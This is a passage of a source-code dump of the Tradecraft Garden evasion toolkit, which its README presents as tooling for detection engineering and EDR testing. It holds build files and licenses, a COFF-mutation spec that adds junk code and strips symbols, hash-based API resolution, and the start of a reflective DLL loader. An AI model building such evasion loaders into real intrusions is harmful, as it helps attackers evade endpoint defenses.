# Tradecraft Garden (Crystal Kit) - Full Source Code
This document contains the complete source code and documentation for the Tradecraft Garden project, focusing on Position-Independent Code (PIC) and Reflective DLL Injection.

---
## File: dist.sh

```sh
# do our source code archive
YYMMDD=`date +%y%m%d`
git archive --format tgz --output tcg20$YYMMDD.tgz --prefix tcg/ master

```

## File: Makefile

```text
all:
	cd coffmixing && make $@
	cd libtcg && make $@
	cd modulestomp && make $@
	cd pagestream && make $@
	cd rdllinjection && make $@
	cd simple_bof && make $@
	cd simple_guardrail && make $@
	cd simple_obj && make $@
	cd simple_objmix && make $@
	cd simple_pic && make $@
	cd simple_rdll && make $@
	cd simple_rdll_apihash && make $@
	cd simple_rdll_free && make $@
	cd simple_rdll_mask && make $@
	cd simple_rdll_patch && make $@
	cd simple_rdll_hook && make $@
	cd simple_rdll_hook/modules/xorhooks && make $@
	cd simple_rdll_hook/modules/stackcutting && make $@

	cd simple_rdll_transforms && make $@
	cd simple_rdll_transforms/modules/aes && make $@
	cd simple_rdll_transforms/modules/base64 && make $@
	cd simple_rdll_transforms/modules/hex && make $@
	cd simple_rdll_transforms/modules/hexraw && make $@
	cd simple_rdll_transforms/modules/lznt1 && make $@
	cd simple_rdll_transforms/modules/rc4 && make $@
	cd simple_rdll_transforms/modules/xor && make $@

	cd simple_unwind && make $@

clean:
	cd coffmixing && make $@
	cd libtcg && make $@
	cd modulestomp && make $@
	cd pagestream && make $@
	cd rdllinjection && make $@
	cd simple_bof && make $@
	cd simple_guardrail && make $@
	cd simple_obj && make $@
	cd simple_objmix && make $@
	cd simple_pic && make $@
	cd simple_rdll && make $@
	cd simple_rdll_apihash && make $@
	cd simple_rdll_free && make $@
	cd simple_rdll_mask && make $@
	cd simple_rdll_patch && make $@
	cd simple_rdll_hook && make $@
	cd simple_rdll_hook/modules/xorhooks && make $@
	cd simple_rdll_hook/modules/stackcutting && make $@

	cd simple_rdll_transforms && make $@
	cd simple_rdll_transforms/modules/aes && make $@
	cd simple_rdll_transforms/modules/base64 && make $@
	cd simple_rdll_transforms/modules/hex && make $@
	cd simple_rdll_transforms/modules/hexraw && make $@
	cd simple_rdll_transforms/modules/lznt1 && make $@
	cd simple_rdll_transforms/modules/rc4 && make $@
	cd simple_rdll_transforms/modules/xor && make $@

	cd simple_unwind && make $@

```

## File: README.txt

```text

Tradecraft Garden
=================

The Tradecraft Garden is an open source corpora of in-memory evasion tradecraft, both load and runtime, 
packaged into position-independent capability loaders.

The technical push of this project is to decompose hacking tool tradecraft into simple units of 
interchangeable parts, separate from C2 frameworks. These separated and interchangeable parts are security 
ground truth. It’s a goal of this project to encourage use of security ground truth outputs for:

 * Breach and Attack Simulation
 * Detection Engineering
 * EDR Test and Evaluation
 * Security Testing Exercises

The broader goal of Tradecraft Garden is to model an approach to ground truth security research that:

 * informs the security conversation
 * serves as a public good resource for others to build on
 * can demonstrate ideas, in context, while serving multiple security use cases and communities

The latest Tradecraft Garden files are at:

https://tradecraftgarden.org

Crystal Palace
==============

Tradecraft Garden's position-independent DLL loaders build on Crystal Palace, an open source linker and
linker specialized to the needs of writing position-independent DLL loaders.

Crystal Palace is open source software and is part of the Tradecraft Garden.

https://tradecraftgarden.org/crystalpalace.html

Compiling
=========

Use 'make clean' to clean all of the targets

Use 'make all' to build all of the targets.

Tradecraft Garden projects are built with MinGW32 on Linux

Copyrights
==========

Like all projects, Tradecraft Garden benefits from and is derivative of works and efforts that have come
before it. The following projects and codes were sourced in the development of these sub-projects. 

These projects are copyright their respective developers. All rights reserved.

ReflectiveDLLInjection (Modifications) [BSD license]
Copyright (C) 2013-2025, Rapid7, Inc. and other authors
https://github.com/rapid7/ReflectiveDLLInjection/blob/81cde88bebaa9fe782391712518903b5923470fb/dll/src/ReflectiveLoader.c#L34

ReflectiveDLLInjection [BSD license]
Copyright (c) 2011, Stephen Fewer of Harmony Security (www.harmonysecurity.com)
https://github.com/stephenfewer/ReflectiveDLLInjection

License
=======

Tradecraft Garden projects are:

Copyright (C) 2025-2026 Adversary Fan Fiction Writers Guild (https://aff-wg.org)

Each Tradecraft Garden sub-project is released under a specific license. Most are licensed under the
3-Clause BSD license. See LICENSE.txt within each sub-project's folder.

```

## File: coffmixing/LICENSE.txt

```text
Copyright 2025-2026 Adversary Fan Fiction Writers Guild

Redistribution and use in source and binary forms, with or without modification, are
permitted provided that the following conditions are met:

1. Redistributions of source code must retain the above copyright notice, this list of
conditions and the following disclaimer.

2. Redistributions in binary form must reproduce the above copyright notice, this list of
conditions and the following disclaimer in the documentation and/or other materials provided
with the distribution.

3. Neither the name of the copyright holder nor the names of its contributors may be used to
endorse or promote products derived from this software without specific prior written
permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS “AS IS” AND ANY EXPRESS
OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

Copyright (c) 2011, Stephen Fewer of Harmony Security (www.harmonysecurity.com)
All rights reserved.
 
Redistribution and use in source and binary forms, with or without modification, are permitted 
provided that the following conditions are met:
 
    * Redistributions of source code must retain the above copyright notice, this list of 
conditions and the following disclaimer.
 
    * Redistributions in binary form must reproduce the above copyright notice, this list of 
conditions and the following disclaimer in the documentation and/or other materials provided 
with the distribution.
 
    * Neither the name of Harmony Security nor the names of its contributors may be used to
endorse or promote products derived from this software without specific prior written permission.
 
THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR 
IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND
FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR 
CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR 
CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR 
SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY 
THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR 
OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE 
POSSIBILITY OF SUCH DAMAGE.

```

## File: coffmixing/Makefile

```text
CC=i686-w64-mingw32-gcc
CC_64=x86_64-w64-mingw32-gcc
CFLAGS=-O1 -fno-jump-tables -fno-omit-frame-pointer -shared -Wall -Wno-pointer-arith

.PHONY: all x86 x64 clean

all: x86 x64

bin:
	mkdir -p bin

x86: bin
	$(CC) -DWIN_X86 $(CFLAGS) -c src/services.c -o bin/services.x86.o
	$(CC) -DWIN_X86 $(CFLAGS) -c src/mixin.c -o bin/mixin.x86.o

x64: bin
	$(CC_64) -DWIN_X64 $(CFLAGS) -c src/services.c -o bin/services.x64.o
	$(CC_64) -DWIN_X64 $(CFLAGS) -c src/mixin.c -o bin/mixin.x64.o

clean:
	rm -rf bin

```

## File: coffmixing/mixer.spec

```text
#
# Demonstrate COFF mixing and restoring unwind information (x64)
#
capability.x86:
	push $OBJECT
		# apply +optimize & +mutate here, because this COFF is our finished capability
		make coff +optimize +mutate

		# bring in our services module
		load "bin/services.x86.o"
			merge

		# enable dynamic function resolution for anything we want handled by a resolver
		dfr "_resolve" "ror13" "KERNEL32, NTDLL"
		dfr "_resolve_ext" "strings"

		# merge the Tradecraft Garden Library
		mergelib "../libtcg/libtcg.x86.zip"

		export

capability.x64:
	push $OBJECT
		make coff +optimize +mutate

		load "bin/services.x64.o"
			merge

		dfr "resolve" "ror13" "KERNEL32, NTDLL"
		dfr "resolve_ext" "strings"

		mergelib "../libtcg/libtcg.x64.zip"

		export


x86:
	# capability is a callable label to build our capability COFF and put it on the stack
	.capability
		# we're making a COFF again, but using +disco to randomize function order
		make coff +disco

		# get rid of symbols from our capability
		strip "_ParseDLL, _findFunctionByHash, _findModuleByHash, _GetDataDirectory, _resolve, _resolve_ext"

		# let's load object(s) from one or more programs and merge them in.
		load "bin/mixin.x86.o"
			merge

		export

x64:
	.capability
		# +unwind is x64 only, generates .pdata and .xdata sections for this COFF
		make coff +unwind +disco

		load "bin/mixin.x64.o"
			merge

		strip "ParseDLL, findFunctionByHash, findModuleByHash, GetDataDirectory, resolve, resolve_ext"

		export

```

## File: coffmixing/src/mixin.c

```c
/*
 * Some "junk" code to mix into our COFF. Why not?
 */
#include <windows.h>
#include <stdio.h>

void a() {
	printf("A is for apple!");
}

void b() {
	printf("B is for bat.");
}

void c() {
	printf("C is for cat");
}

void d() {
	printf("D is for doofus");
}

void e() {
	printf("E is for echo");
}

void f() {
	printf("F is for foo()");
}

void g() {
	printf("G is for g()");
}

void h() {
	printf("H is for hater");
}

void i() {
	printf("I is for intel");
}

void j() {
	printf("J is for jIRCii");
}

void k() {
	printf("K is for, I don't know a cool word that starts with K");
}

void l() {
	printf("L is for lamer");
}

void m() {
	printf("M is for... mulch");
}

void n() {
	printf("N is for NT");
}

void o() {
	printf("O is for optimize");
}

void p() {
	printf("P is for parameter");
}

void q() {
	printf("Q is for quit");
}

void r() {
	printf("R is for rename");
}

void s() {
	printf("S is for something");
}

void t() {
	printf("T is for todo, as-in I have a big todo list");
}

void u() {
	printf("U is for you, as-in you get the idea.");
}

```

## File: coffmixing/src/services.c

```c
/*
 * Copyright 2025-2026 Adversary Fan Fiction Writers Guild
 *
 * Redistribution and use in source and binary forms, with or without modification, are
 * permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this list of
 * conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice, this list of
 * conditions and the following disclaimer in the documentation and/or other materials provided
 * with the distribution.
 *
 * 3. Neither the name of the copyright holder nor the names of its contributors may be used to
 * endorse or promote products derived from this software without specific prior written
 * permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS “AS IS” AND ANY EXPRESS
 * OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
 * COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
 * EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

#include <windows.h>
#include "tcg.h"

WINBASEAPI HMODULE WINAPI KERNEL32$GetModuleHandleA (LPCSTR lpModuleName);

/*
 * This is our opt-in Dynamic Function Resolution resolver. It turns MODULE$Function into pointers.
 * See dfr "resolve" "ror13" "KERNEL32, NTDLL" in loader.spec
 */
FARPROC resolve(DWORD modHash, DWORD funcHash) {
	HANDLE hModule = findModuleByHash(modHash);
	return findFunctionByHash(hModule, funcHash);
}

/*
 * This is our default DFR resolver. It resolves Win32 APIs not handled by another resolver.
 */
FARPROC resolve_ext(char * mod, char * func) {
	HANDLE hModule = KERNEL32$GetModuleHandleA(mod);
	if (hModule == NULL)
		hModule = LoadLibraryA(mod);

	return GetProcAddress(hModule, func);
}

```

## File: coffmixing/src/tcg.h

```h
/*
 * Copyright 2025-2026 Adversary Fan Fiction Writers Guild
 *
 * Redistribution and use in source and binary forms, with or without modification, are
 * permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this list of
 * conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice, this list of
 * conditions and the following disclaimer in the documentation and/or other materials provided
 * with the distribution.
 *
 * 3. Neither the name of the copyright holder nor the names of its contributors may be used to
 * endorse or promote products derived from this software without specific prior written
 * permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS
 * OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
 * COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
 * EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

// linker intrinsic for __transfer (x64 only)
#ifdef WIN_X64
typedef void (* TRANSFERFUNC)();
void __transfer(TRANSFERFUNC func) __attribute__((noreturn));
#endif

// used by both the Pico Loader and DLL loader
typedef struct {
	__typeof__(LoadLibraryA)   * LoadLibraryA;
	__typeof__(GetProcAddress) * GetProcAddress;
} IMPORTFUNCS;

// used throughout TCG and useful for parsing preplen'd content
typedef struct {
        int   length;
        char  value[];
} _RESOURCE;

// linker intrinsic to map a function hash to a hook registered via Crystal Palace
FARPROC __resolve_hook(DWORD funcHash);

/*
 * Structs used by our DLL loader
 */

#define PTR_OFFSET(x, y) ( (void *)(x) + (ULONG)(y) )
#define DEREF( name )*(UINT_PTR *)(name)

typedef struct {
	IMAGE_DOS_HEADER      * DosHeader;
	IMAGE_NT_HEADERS      * NtHeaders;
	IMAGE_OPTIONAL_HEADER * OptionalHeader;
} DLLDATA;

/*
 * utility functions
 */
DWORD adler32sum(unsigned char * buffer, DWORD length);
DWORD ror13hash(const char * c);

/*
 * printf-style debugging.
 */
void dprintf(char * format, ...);

/*
 * PICO running functions
 */
typedef void (*PICOMAIN_FUNC)(char * arg);

PICOMAIN_FUNC PicoGetExport(char * src, char * base, int tag);
PICOMAIN_FUNC PicoEntryPoint(char * src, char * base);
int PicoCodeSize(char * src);
int PicoDataSize(char * src);
void PicoLoad(IMPORTFUNCS * funcs, char * src, char * dstCode, char * dstData);
_RESOURCE * PicoGetUnwindData(char * src, char * base);

/*
 * Resolve functions by walking the export address table
 */
FARPROC findFunctionByHash(HANDLE hModule, DWORD wantedFunctionHash);
HANDLE findModuleByHash(DWORD moduleHash);

/*
 * DLL parsing and loading functions
 */
typedef BOOL WINAPI (*DLLMAIN_FUNC)(HINSTANCE, DWORD, LPVOID);

DLLMAIN_FUNC EntryPoint(DLLDATA * dll, void * base);
IMAGE_DATA_DIRECTORY * GetDataDirectory(DLLDATA * dll, UINT entry);
void LoadDLL(DLLDATA * dll, char * src, char * dst);
void LoadSections(DLLDATA * dll, char * src, char * dst);
void ParseDLL(char * src, DLLDATA * data);
void ProcessImports(IMPORTFUNCS * funcs, DLLDATA * dll, char * dst);
void ProcessRelocations(DLLDATA * dll, char * src, char * dst);
DWORD SizeOfDLL(DLLDATA * data);

/*
 * A macro to figure out our caller
 * https://github.com/rapid7/ReflectiveDLLInjection/blob/81cde88bebaa9fe782391712518903b5923470fb/dll/src/ReflectiveLoader.c#L34C1-L46C1
 */
#ifdef __MINGW32__
#define WIN_GET_CALLER() __builtin_extract_return_addr(__builtin_return_address(0))
#else
#pragma intrinsic(_ReturnAddress)
#define WIN_GET_CALLER() _ReturnAddress()
#endif

```

## File: libtcg/LICENSE.txt

```text
Copyright 2025-2026 Adversary Fan Fiction Writers Guild

Redistribution and use in source and binary forms, with or without modification, are
permitted provided that the following conditions are met:

1. Redistributions of source code must retain the above copyright notice, this list of
conditions and the following disclaimer.

2. Redistributions in binary form must reproduce the above copyright notice, this list of
conditions and the following disclaimer in the documentation and/or other materials provided
with the distribution.

3. Neither the name of the copyright holder nor the names of its contributors may be used to
endorse or promote products derived from this software without specific prior written
permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS “AS IS” AND ANY EXPRESS
OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

Copyright (c) 2011, Stephen Fewer of Harmony Security (www.harmonysecurity.com)
All rights reserved.
 
Redistribution and use in source and binary forms, with or without modification, are permitted 
provided that the following conditions are met:
 
    * Redistributions of source code must retain the above copyright notice, this list of 
conditions and the following disclaimer.
 
    * Redistributions in binary form must reproduce the above copyright notice, this list of 
conditions and the following disclaimer in the documentation and/or other materials provided 
with the distribution.
 
    * Neither the name of Harmony Security nor the names of its contributors may be used to
endorse or promote products derived from this software without specific prior written permission.
 
THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR 
IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND
FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR 
CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR 
CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR 
SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY 
THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR 
OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE 
POSSIBILITY OF SUCH DAMAGE.

```

## File: libtcg/Makefile

```text
CC=i686-w64-mingw32-gcc
CC_64=x86_64-w64-mingw32-gcc
CFLAGS=-O1 -fno-jump-tables -shared -Wall -Wno-pointer-arith
CFLAGS_EXT=-fno-omit-frame-pointer

.PHONY: all x86 x64 clean

all: x86 x64

bin:
	mkdir -p bin

x86: bin
	$(CC) -DWIN_X86 $(CFLAGS) -c src/loaddll.c     -o bin/loaddll.x86.o
	$(CC) -DWIN_X86 $(CFLAGS) -c src/resolve_eat.c -o bin/resolve_eat.x86.o
	$(CC) -DWIN_X86 $(CFLAGS) -c src/picorun.c     -o bin/picorun.x86.o
	$(CC) -DWIN_X86 $(CFLAGS) $(CFLAGS_EXT) -c src/debug.c       -o bin/debug.x86.o
	$(CC) -DWIN_X86 $(CFLAGS) -c src/util.c        -o bin/util.x86.o
	zip -q -j libtcg.x86.zip bin/*.x86.o

x64: bin
	$(CC_64) -DWIN_X64 $(CFLAGS) -c src/loaddll.c     -o bin/loaddll.x64.o
	$(CC_64) -DWIN_X64 $(CFLAGS) -c src/resolve_eat.c -o bin/resolve_eat.x64.o
	$(CC_64) -DWIN_X64 $(CFLAGS) -c src/picorun.c     -o bin/picorun.x64.o
	$(CC_64) -DWIN_X64 $(CFLAGS) $(CFLAGS_EXT) -c src/debug.c       -o bin/debug.x64.o
	$(CC_64) -DWIN_X64 $(CFLAGS) -c src/util.c        -o bin/util.x64.o
	zip -q -j libtcg.x64.zip bin/*.x64.o

clean:
	rm -rf bin
	rm -f libtcg.x86.zip
	rm -f libtcg.x64.zip

```

## File: libtcg/src/debug.c

```c
/*
 * Copyright 2025-2026 Adversary Fan Fiction Writers Guild
 *
 * Redistribution and use in source and binary forms, with or without modification, are
 * permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this list of
 * conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice, this list of
 * conditions and the following disclaimer in the documentation and/or other materials provided
 * with the distribution.
 *
 * 3. Neither the name of the copyright holder nor the names of its contributors may be used to
 * endorse or promote products derived from this software without specific prior written
 * permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS “AS IS” AND ANY EXPRESS
 * OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
 * COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
 * EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

#include "loaderdefs.h"
#include "tcg.h"

WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAlloc (LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
WINBASEAPI WINBOOL WINAPI KERNEL32$VirtualFree (LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);
WINBASEAPI VOID WINAPI KERNEL32$OutputDebugStringA (LPCSTR lpOutputString);
WINBASEAPI int __cdecl MSVCRT$vsnprintf(char * __restrict__ d,size_t n,const char * __restrict__ format,va_list arg);

void dprintf(char * format, ...) {
	int    len;
	char * temp;

	va_list args;

	/* figure out the length of our buffer */
	va_start(args, format);
	len  = MSVCRT$vsnprintf(NULL, 0, format, args);
	va_end(args);

	/* allocate our memory */
	temp = KERNEL32$VirtualAlloc(NULL, len + 1, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE);
	if (temp == NULL)
		return;

	/* format everything */
	va_start(args, format);
	MSVCRT$vsnprintf(temp, len + 1, format, args);
	va_end(args);

	/* print it */
	KERNEL32$OutputDebugStringA(temp);

	/* free our memory and move on with our lives */
	KERNEL32$VirtualFree(temp, 0, MEM_RELEASE);
}

```

## File: libtcg/src/loaddll.c

```c
/*
 * Copyright 2025-2026 Adversary Fan Fiction Writers Guild
 *
 * Redistribution and use in source and binary forms, with or without modification, are
 * permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this list of
 * conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice, this list of
 * conditions and the following disclaimer in the documentation and/or other materials provided
 * with the distribution.
 *
 * 3. Neither the name of the copyright holder nor the names of its contributors may be used to
 * endorse or promote products derived from this software without specific prior written
 * permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS “AS IS” AND ANY EXPRESS
 * OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
 * COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
 * EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

#include "loaderdefs.h"
#include "tcg.h"

typedef struct {
	WORD	offset:12;
	WORD	type:4;
} __IMAGE_RELOC, *__PIMAGE_RELOC;

IMAGE_DATA_DIRECTORY * GetDataDirectory(DLLDATA * dll, UINT entry) {
	return dll->OptionalHeader->DataDirectory + entry;
}

void ProcessRelocation(DLLDATA * dll, char * src, char * dst, IMAGE_BASE_RELOCATION * relocation, ULONG_PTR newBaseAddress) {
	void *          relocAddr    = PTR_OFFSET(dst, relocation->VirtualAddress);
	DWORD           relocEntries = (relocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(__IMAGE_RELOC);
	__IMAGE_RELOC * relocEntry   = (__IMAGE_RELOC *)PTR_OFFSET( relocation, sizeof(IMAGE_BASE_RELOCATION) );

	for (int x = 0; x < relocEntries; x++) {
		if (relocEntry->type == IMAGE_REL_BASED_DIR64) {
			*(ULONG_PTR *)(relocAddr + relocEntry->offset) += newBaseAddress;
		}
		else if (relocEntry->type == IMAGE_REL_BASED_HIGHLOW) {
			*(DWORD *)(relocAddr + relocEntry->offset) += (DWORD)newBaseAddress;
		}
		else if (relocEntry->type == IMAGE_REL_BASED_HIGH) {
			*(WORD *)(relocAddr + relocEntry->offset) += HIWORD(newBaseAddress);
		}
		else if (relocEntry->type == IMAGE_REL_BASED_LOW) {
			*(WORD *)(relocAddr + relocEntry->offset) += LOWORD(newBaseAddress);
		}

		relocEntry++;
	}
}

void ProcessRelocations(DLLDATA * dll, char * src, char * dst) {
	IMAGE_DATA_DIRECTORY  * relocationData;
	ULONG_PTR               newBaseAddress;
	IMAGE_BASE_RELOCATION * relocation;

	relocationData = GetDataDirectory(dll, IMAGE_DIRECTORY_ENTRY_BASERELOC);

	// calculate the base address delta and perform relocations (even if we load at desired image base)
	newBaseAddress = (ULONG_PTR)dst - (ULONG_PTR)dll->OptionalHeader->ImageBase;

	/* check if there are relocations present */
	if (relocationData->Size) {
		relocation = (IMAGE_BASE_RELOCATION *)( dst + relocationData->VirtualAddress );

		while (relocation->SizeOfBlock) {
			/* process this next relocation */
			ProcessRelocation(dll, src, dst, relocation, newBaseAddress);

			/* go on to our next relocation */
			relocation = (IMAGE_BASE_RELOCATION *)PTR_OFFSET(relocation, relocation->SizeOfBlock);
		}
	}
}

void ProcessImport(IMPORTFUNCS * funcs, DLLDATA * dll, char * dst, IMAGE_IMPORT_DESCRIPTOR * importDesc) {
	void                    * hLib;
	IMAGE_THUNK_DATA        * firstThunk;
	IMAGE_THUNK_DATA        * originalFirstThunk;
	IMAGE_IMPORT_BY_NAME    * importByName;
	ULONG_PTR                 importByOrdinal;

	/* load whatever library we need here */
	hLib = (void *)funcs->LoadLibraryA((char *)PTR_OFFSET(dst, importDesc->Name));

	/* get our thunks */
	firstThunk         = (IMAGE_THUNK_DATA *)PTR_OFFSET( dst, importDesc->FirstThunk );
	originalFirstThunk = (IMAGE_THUNK_DATA *)PTR_OFFSET( dst, importDesc->OriginalFirstThunk );

	/* NOTE: IMAGE_THUNK_DATA has one union member, u1. All of the fields are the same size.
	 * The different member names seem more for semantics than anything else. We're skipping the
	 * field names in the union and just stomping over whatever is in this pointer-sized structure */

	/* https://devblogs.microsoft.com/oldnewthing/20231129-00/?p=109077 */

	while ( DEREF(firstThunk) ) {
		if ( originalFirstThunk && (originalFirstThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG) ) {
			/*
			 * I'm OK passing a ULONG_PTR with our ordinal. Windows (will likely) just check
			 * that our pointer is < MAXUSHORT ala ReactOS:
